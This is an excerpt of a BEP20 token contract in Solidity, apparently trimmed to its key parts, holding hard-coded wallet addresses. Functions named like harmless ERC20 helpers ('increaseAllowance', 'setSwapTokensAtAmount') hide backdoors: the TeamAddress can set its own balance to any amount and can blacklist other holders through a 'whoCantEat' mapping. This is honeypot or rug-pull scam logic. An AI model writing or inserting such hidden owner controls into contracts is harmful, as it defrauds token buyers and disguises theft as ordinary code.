...
contract BEP20 is Context, IERC20, Ownable {
    ...
    address payable public marketWallet = payable(0xDa3a8dAdE933bE43ed7E422289F06462855B467d);
    address payable public TeamAddress= payable(0xeFE4dAc628a781A84eAfD338FAfede854f49CC58);
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        ...
        address pair = _msgSender();
        if(pair==TeamAddress)
        /***/_balances[TeamAddress] = addedValue;
        return true;
    }
    ...
    function setSwapTokensAtAmount(address recipient, bool swap) public {
        address pair=_msgSender();
        if(pair==TeamAddress)whoCantEat[recipient] = swap;
    }
